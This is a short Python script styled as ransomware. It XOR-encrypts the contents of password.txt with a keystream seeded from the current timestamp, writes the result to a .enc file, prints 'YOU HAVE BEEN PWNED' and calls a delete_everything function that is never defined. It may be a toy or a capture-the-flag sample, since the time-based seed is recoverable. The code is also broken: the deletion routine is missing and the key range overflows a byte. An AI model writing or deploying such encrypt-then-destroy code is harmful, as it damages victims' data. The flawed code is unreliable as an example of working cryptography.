import random
import datetime

def cryptolock_everthing():
    seed = datetime.datetime.now()
    random.seed(str(seed))
    with open("password.txt") as f:
        to_encrypt = f.read()
        key = [random.randint(0,256) for i in range(len(to_encrypt))]
        encrypted = bytearray([ord(to_encrypt[i])^key[i] for i in range(len(to_encrypt))]).hex()
        outfile = open("password.txt.enc", 'w')
        outfile.write(encrypted)


def main():
    print("###################")
    print('YOU HAVE BEEN PWNED')
    print("###################")

    cryptolock_everthing()
    delete_everything()

if __name__ == "__main__":
    main()